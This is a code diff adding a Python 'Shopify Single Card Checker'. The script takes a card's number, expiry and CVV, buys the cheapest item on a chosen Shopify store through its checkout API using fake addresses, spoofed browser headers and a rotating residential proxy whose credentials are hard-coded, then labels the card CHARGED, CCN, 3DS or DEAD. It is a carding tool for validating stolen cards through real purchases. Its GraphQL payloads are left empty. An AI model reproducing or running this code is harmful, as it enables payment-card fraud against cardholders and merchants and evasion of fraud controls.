@@ -1,0 +1,661 @@
+import sys
+from fake_useragent import UserAgent
+import requests
+from urllib.parse import urlparse
+import json
+import time
+import re
+import urllib3
+from colorama import init, Fore, Style
+import threading
+import random
+
+print_lock = threading.Lock()
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Initialize colorama
+init()
+
+# Proxy configuration
+proxy_username = "pc2ilBRBZI-res-any"
+proxy_password = "PC_2VvwDzgxwpqOYXOOu"
+proxy_host = "proxy-eu.proxy-cheap.com"
+proxy_port = 5959
+
+# Retry count and max retries
+max_retries = 5
+retry_count = 0
+
+# Initialize UserAgent generator
+ua = UserAgent().chrome
+
+# Helper function equivalent to PHP's find_between
+def find_between(content, start, end):
+    try:
+        start_pos = content.index(start) + len(start)
+        end_pos = content.index(end, start_pos)
+        return content[start_pos:end_pos]
+    except ValueError:
+        return ''
+
+# Function to get rotating proxy
+def get_proxy():
+    proxy_url = f"http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
+    return {
+        'http': proxy_url,
+        'https': proxy_url
+    }
+
+# Function to make requests with proxy and retry logic
+def make_request_with_proxy(url, method='GET', headers=None, json_data=None, data=None, cookies=None, timeout=15):
+    global retry_count
+    global max_retries
+    
+    proxy = get_proxy()
+    
+    for attempt in range(max_retries):
+        try:
+            if method.upper() == 'GET':
+                response = requests.get(url, headers=headers, proxies=proxy, 
+                                      verify=False, timeout=timeout, cookies=cookies)
+            elif method.upper() == 'POST':
+                response = requests.post(url, headers=headers, json=json_data, 
+                                       data=data, proxies=proxy, verify=False, 
+                                       timeout=timeout, cookies=cookies)
+            else:
+                raise ValueError(f"Unsupported HTTP method: {method}")
+            
+            response.raise_for_status()
+            return response
+            
+        except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
+            retry_count += 1
+            print(f"[Retry {retry_count}/{max_retries}] Proxy error for {url}: {e}")
+            time.sleep(1)
+            
+            if attempt == max_retries - 1:
+                raise Exception(f"Failed after {max_retries} attempts: {e}")
+
+# Function to parse single CC input
+def parse_cc_input(cc_string):
+    try:
+        cc_parts = cc_string.strip().split('|')
+        if len(cc_parts) >= 4:
+            return {
+                'cc': cc_parts[0],
+                'month': cc_parts[1],
+                'year': cc_parts[2],
+                'cvv': cc_parts[3]
+            }
+        else:
+            return None
+    except Exception as e:
+        print(f"Error parsing CC: {e}")
+        return None
+
+# Take single credit card input from user
+print("\n" + "="*60)
+print("         Shopify Single Card Checker")
+print("="*60)
+cc_input = input("\nEnter Credit Card (format: CC|MM|YY|CVV): ").strip()
+
+cc_data = parse_cc_input(cc_input)
+
+if not cc_data:
+    print("❌ Invalid credit card format!")
+    print("Format should be: 4111111111111111|12|25|123")
+    sys.exit(1)
+
+print(f"\n✅ Card parsed successfully:")
+print(f"   CC: {cc_data['cc'][:4]}****{cc_data['cc'][-4:]}")
+print(f"   Expiry: {cc_data['month']}/{cc_data['year']}")
+print(f"   CVV: {cc_data['cvv']}")
+
+# Input site URL
+site_input = input("\nEnter Shopify site URL (e.g., https://example.com): ").strip()
+
+if not site_input.startswith(('http://', 'https://')):
+    site_input = 'https://' + site_input
+
+# Validate and sanitize URL
+parsed_url = urlparse(site_input)
+if not parsed_url.scheme or not parsed_url.netloc:
+    print(json.dumps({'Response': 'Invalid URL'}))
+    exit()
+
+base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+products_url = f"{base_url}/products.json"
+
+# Request headers with fake user agent
+headers = {
+    'User-Agent': ua,
+    'Accept': 'application/json',
+}
+
+try:
+    response = make_request_with_proxy(products_url, 'GET', headers=headers)
+    
+    # Function to extract product with minimum price
+    def get_minimum_price_product_details(json_data):
+        try:
+            data = json.loads(json_data)
+        except json.JSONDecodeError:
+            raise Exception("Invalid JSON format")
+
+        if not isinstance(data, dict) or 'products' not in data:
+            raise Exception("Invalid JSON format or missing 'products' key")
+
+        min_price = None
+        min_price_details = {
+            'id': None,
+            'price': None,
+            'title': None
+        }
+
+        for product in data['products']:
+            for variant in product.get('variants', []):
+                price = float(variant['price'])
+                if price >= 0.01 and (not variant.get('available') is False):
+                    if min_price is None or price < min_price:
+                        min_price = price
+                        min_price_details = {
+                            'id': variant['id'],
+                            'price': variant['price'],
+                            'title': product['title']
+                        }
+
+        if min_price is None:
+            raise Exception("No products found with price greater than or equal to 0.01")
+
+        return min_price_details
+
+    product_details = get_minimum_price_product_details(response.text)
+
+    min_price_product_id = product_details['id']
+    min_price = product_details['price']
+    product_title = product_details['title']
+
+    if not min_price_product_id:
+        raise Exception('Product id is empty')
+
+    print("\n" + "="*60)
+    print("         Product Found")
+    print("="*60)
+    print(f"✅ Title: {product_title}")
+    print(f"✅ ID: {min_price_product_id}")
+    print(f"✅ Price: {min_price}")
+    print("="*60 + "\n")
+
+except Exception as e:
+    print(json.dumps({'Response': f'Error in request: {str(e)}'}))
+    sys.exit(1)
+
+# Now define the necessary variables for further actions
+site1 = site_input
+parsed_url = urlparse(site1)
+domain = parsed_url.hostname
+cookie = 'cookie.txt'
+prodid = min_price_product_id
+cart_url = f"{base_url}/cart/{prodid}:1"
+
+# Address details function
+def get_address_details(country_code):
+    if country_code == 'US':
+        return {
+            'address': "420 Park ave",
+            'city': "New York",
+            'state': "NY",
+            'zip': "10016",
+            'phone': "(879) 658-2525",
+            'country': "United States",
+            'currency': "USD",
+            'zone_code': "NY",
+            'latitude': 41.1456,
+            'longitude': -73.9876
+        }
+    elif country_code == 'AU':
+        return {
+            'address': "134 Buckhurst Street",
+            'city': "South Melbourne",
+            'state': "VIC",
+            'zip': "3205",
+            'phone': "07 3803 6136",
+            'country': "Australia",
+            'currency': "AUD",
+            'zone_code': "VIC",
+            'latitude': -37.8351,
+            'longitude': 144.9571
+        }
+    else:
+        return {
+            'address': "133 New York 59",
+            'city': "Monsey",
+            'state': "NY",
+            'zip': "10952",
+            'phone': "(879) 658-2525",
+            'country': "United States",
+            'currency': "USD",
+            'zone_code': "NY",
+            'latitude': 41.1456,
+            'longitude': -73.9876
+        }
+
+# Main function to process single card
+def send_request(cc_data):
+    global retry_count
+    global max_retries
+    
+    cc = cc_data['cc']
+    month = cc_data['month']
+    year = cc_data['year']
+    cvv = cc_data['cvv']
+    
+    # Convert short year to full year
+    if len(year) <= 2:
+        year = f"20{year}"
+
+    # Normalize sub_month
+    sub_month = str(int(month))
+
+    print(f"\n🚀 Starting checkout process for card: {cc[:4]}****{cc[-4:]}")
+    print("-" * 60)
+    
+    retry_count = 0
+    receipt_id = None
+    gateway_result = "Unknown Gateway"
+    
+    while retry_count < max_retries:
+        try:
+            # Step 1: Get initial session
+            headers = {
+                'User-Agent': ua,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Priority': 'u=0, i',
+                'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+                'Sec-CH-UA-Mobile': '?0',
+                'Sec-CH-UA-Platform': '"Windows"',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1',
+                'Upgrade-Insecure-Requests': '1',
+            }
+            
+            print("📡 Step 1: Getting initial session...")
+            response = make_request_with_proxy(cart_url, 'GET', headers=headers, cookies={'cookie': cookie})
+
+            # Try to extract the country code from response
+            country_code_match = re.search(r'"supportedCountries":"([^"]+)"', response.text)
+            country_code = country_code_match.group(1) if country_code_match else 'US'
+            print(f"🌍 Detected country: {country_code}")
+
+            address_details = get_address_details(country_code)
+            
+            # Extract tokens and session details
+            location = response.headers.get('Location', '')
+            final_url = response.url
+
+            checkout_token_match = find_between(final_url, '/cn/', '?')
+            if not checkout_token_match:
+                print(f"❌ Checkout token not found in redirect URL: {final_url}")
+                raise ValueError("❌ Checkout token not found in redirect URL")
+
+            web_build_id = find_between(response.text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;}')
+            if not web_build_id:
+                raise ValueError("Web build id not found")
+
+            x_checkout_one_session_token = find_between(response.text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
+            if not x_checkout_one_session_token:
+                raise ValueError("Session token not found")
+
+            queue_token = find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
+            if not queue_token:
+                raise ValueError("Queue token not found")
+
+            stable_id = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
+            if not stable_id:
+                raise ValueError("Stable ID not found")
+
+            payment_method_identifier = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
+            if not payment_method_identifier:
+                raise ValueError("Payment Method Identifier not found")
+
+            print("✅ All session tokens extracted successfully")
+            break
+
+        except Exception as e:
+            retry_count += 1
+            print(f"[Retry {retry_count}/{max_retries}] Error in Step 1: {e}")
+            continue
+
+    else:
+        print("❌ Failed to get initial session after all retries")
+        result = {
+            'Response': 'Failed to get initial session',
+            'Price': min_price
+        }
+        print(json.dumps(result))
+        return
+
+    retry_count = 0
+
+    # Step 2: Get credit card nonce/token
+    while retry_count < max_retries:
+        try:
+            token_headers = {
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/json',
+                'origin': 'https://checkout.shopifycs.com',
+                'referer': 'https://checkout.shopifycs.com/',
+                'user-agent': ua
+            }
+
+            payload = {
+                "credit_card": {
+                    "number": cc,
+                    "month": int(sub_month),
+                    "year": int(year),
+                    "verification_value": cvv,
+                    "name": "insane xd"
+                },
+                "payment_session_scope": domain
+            }
+
+            print("💳 Step 2: Getting card token/nonce...")
+            response = make_request_with_proxy("https://deposit.shopifycs.com/sessions", 
+                                             'POST', headers=token_headers, json_data=payload)
+
+            response2js = response.json()
+            cctoken = response2js.get('id')
+            if not cctoken:
+                raise ValueError("❌ Card token (nonce) not returned")
+
+            print(f"✅ Card token received: {cctoken[:20]}...")
+            break
+
+        except Exception as e:
+            retry_count += 1
+            print(f"[Retry {retry_count}/{max_retries}] Error in Step 2: {e}")
+            continue
+
+    else:
+        result = {
+            'Response': 'Card Token not found',
+            'Price': min_price
+        }
+        print(json.dumps(result))
+        return
+
+    retry_count = 0
+
+    # Step 3: Proposal and shipping
+    while retry_count < max_retries:
+        try:
+            headers = {
+                'accept': 'application/json',
+                'accept-language': 'en-GB',
+                'content-type': 'application/json',
+                'origin': base_url,
+                'referer': f'{base_url}/',
+                'user-agent': ua,
+                'x-checkout-one-session-token': x_checkout_one_session_token,
+                'x-checkout-web-build-id': web_build_id,
+                'x-checkout-web-source-id': checkout_token_match
+            }
+
+            address = get_address_details(country_code)
+
+            propayload = {
+                
+        }
+       
+
+            print("📦 Step 3: Getting proposal and shipping rates...")
+            response = make_request_with_proxy(
+                f"{base_url}/checkouts/unstable/graphql",
+                'POST',
+                headers=headers,
+                json_data=propayload,
+            )
+
+            if response.status_code != 200:
+                raise ValueError(f"Proposal request failed with status {response.status_code}")
+
+            data = response.json()
+            
+            # Parse gateway
+            gateway_info = re.search(r'"extensibilityDisplayName":"([^"]+)"', response.text)
+            if gateway_info:
+                gateway = gateway_info.group(1)
+                gateway_result = f"Shopify + {gateway}" if gateway != "Shopify Payments" else "Shopify Payments"
+            else:
+                gateway_result = "Unknown Gateway"
+
+            seller_proposal = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal")
+
+            if not seller_proposal:
+                if retry_count < max_retries:
+                    retry_count += 1
+                    print("⚠️ Retry: Seller proposal not found")
+                    continue
+                else:
+                    print(json.dumps({'Response': 'Shipping info is empty', 'Price': min_price}))
+                    return
+
+            # Extract handle
+            handle = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("handle", "")
+            if not handle:
+                handle_search = re.search(r',"selectedDeliveryStrategy":{"handle":"(.*?)","__typename":"DeliveryStrategyReference', response.text)
+                handle = handle_search.group(1) if handle_search else ""
+
+            if not handle:
+                if retry_count < max_retries:
+                    retry_count += 1
+                    print("⚠️ Retry: Handle is empty")
+                    continue
+                else:
+                    print(json.dumps({'Response': 'Handle is empty after all attempts', 'Price': min_price}))
+                    return
+
+            # Extract delivery amount
+            delivery_amount = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("amount", {}).get("value", {}).get("amount", "")
+
+            # Extract tax
+            tax = seller_proposal.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "")
+            if not tax:
+                tax_search = re.search(r',"totalAmountIncludedInTarget":{"value":{"amount":"(.*?)","currencyCode":"', response.text)
+                tax = tax_search.group(1) if tax_search else ""
+
+            # Final total
+            total_amount = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", "")
+
+            print(f"✅ Shipping handle: {handle}")
+            print(f"💰 Tax: {tax}")
+            print(f"💵 Total: {total_amount}")
+            print(f"🏦 Gateway: {gateway_result}")
+            
+            break
+
+        except Exception as e:
+            retry_count += 1
+            print(f"[Retry {retry_count}/{max_retries}] Error in Step 3: {e}")
+            continue
+
+    else:
+        print("❌ Failed to get proposal after all retries")
+        return
+
+    retry_count = 0
+
+    # Step 4: Submit for completion
+    while retry_count < max_retries:
+        try:
+            headers = {
+                'accept': 'application/json',
+                'accept-language': 'en-US',
+                'content-type': 'application/json',
+                'origin': base_url,
+                'priority': 'u=1, i',
+                'referer': f'{base_url}/',
+                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': ua,
+                'x-checkout-one-session-token': x_checkout_one_session_token,
+                'x-checkout-web-deploy-stage': 'production',
+                'x-checkout-web-server-handling': 'fast',
+                'x-checkout-web-server-rendering': 'no',
+                'x-checkout-web-source-id': checkout_token_match
+            }
+
+            payload = {
+                
+            }
+
+            submit_url = f'{base_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion'
+
+            print("💸 Step 4: Submitting payment for completion...")
+            response = make_request_with_proxy(
+                submit_url,
+                'POST',
+                headers=headers,
+                json_data=payload
+            )
+            
+            response_text = response.text
+
+            if 'CAPTCHA_METADATA_MISSING' in response_text:
+                print("⚠️ CAPTCHA DETECTED, TRY ANOTHER SITE")
+                break
+
+            response_json = response.json()
+            receipt_id = response_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")
+
+            if receipt_id:
+                print(f"✅ Receipt ID received: {receipt_id}")
+                break
+            else:
+                retry_count += 1
+                print(f"⚠️ Receipt ID not found, retrying ({retry_count}/{max_retries})...")
+                time.sleep(1)
+                if retry_count >= max_retries:
+                    raise Exception("Receipt ID is empty after all attempts")
+
+        except Exception as e:
+            retry_count += 1
+            print(f"[Retry {retry_count}/{max_retries}] Error in Step 4: {e}")
+            continue
+
+    if receipt_id:
+        # Step 5: Poll for receipt
+        try:
+            purl = f"{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
+            phead = {
+                'accept': 'application/json',
+                'accept-language': 'en-US',
+                'content-type': 'application/json',
+                'origin': base_url,
+                'referer': f'{base_url}/',
+                'user-agent': ua,
+                'x-checkout-one-session-token': x_checkout_one_session_token,
+                'x-checkout-web-build-id': web_build_id,
+                'x-checkout-web-source-id': checkout_token_match
+            }
+            
+            pload = {
+                
+                }
+                
+            
+
+            print("🔄 Step 5: Polling for final receipt status...")
+            time.sleep(2)
+            response = make_request_with_proxy(purl, 'POST', headers=phead, json_data=pload)
+
+            response_json = response.json()
+            response_text = json.dumps(response_json)
+
+            # Determine final status
+            if f"{base_url}/thank_you" in response_text or f"{base_url}/post_purchase" in response_text:
+                print("\n" + "="*60)
+                print(Fore.GREEN + "✅ [CHARGED] SUCCESS!")
+                print(f"💰 Amount: {total_amount}")
+                print(f"🏦 Gateway: {gateway_result}")
+                print(f"🧾 Card: {cc[:4]}****{cc[-4:]}")
+                print("="*60)
+
+            elif 'Your order is confirmed' in response_text:
+                print("\n" + "="*60)
+                print(Fore.GREEN + "✅ [ORDER PLACED] SUCCESS!")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            elif 'INCORRECT_ZIP' in response_text:
+                print("\n" + "="*60)
+                print(Fore.LIGHTGREEN_EX + "✅ [CHARGED] INCORRECT ZIP!")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            elif 'INSUFFICIENT_FUNDS' in response_text:
+                print("\n" + "="*60)
+                print(Fore.LIGHTGREEN_EX + "✅ [CHARGED] INSUFFICIENT FUNDS!")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            elif 'INCORRECT_CVC' in response_text:
+                print("\n" + "="*60)
+                print(Fore.LIGHTGREEN_EX + "✅ [CCN] INCORRECT CVC!")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            elif 'CompletePaymentChallenge' in response_text or 'AUTHORIZATION_ERROR' in response_text:
+                print("\n" + "="*60)
+                print(Fore.YELLOW + "⚠️ [3DS] VERIFICATION REQUIRED!")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            elif '/authentications/' in response_text:
+                print("\n" + "="*60)
+                print(Fore.YELLOW + "⚠️ [3DS] CARD REQUIRES 3D SECURE!")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            elif 'processingError' in response_text:
+                error_code = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown Error')
+                print("\n" + "="*60)
+                print(Fore.RED + f"❌ [DEAD] {error_code}")
+                print(f"💰 Amount: {total_amount}")
+                print("="*60)
+
+            else:
+                print("\n" + "="*60)
+                print(Fore.YELLOW + "⚠️ [UNKNOWN] Response needs review")
+                print(f"Response: {response_text[:500]}")
+                print("="*60)
+
+        except Exception as e:
+            print(f"\n❌ Error in final polling: {e}")
+            print(json.dumps({
+                "Response": str(e),
+                "Price": total_amount,
+                "Gateway": gateway_result
+            }))
+
+    else:
+        print("\n" + "="*60)
+        print(Fore.RED + "❌ [FAILED] Could not complete transaction")
+        print("="*60)
+
+# Process the single card
+print("\n" + "="*60)
+print("         Starting Card Check")
+print("="*60)
+send_request(cc_data)
+print("\n" + "="*60)
+print("         Process Complete")
+print("="*60 + "\n")
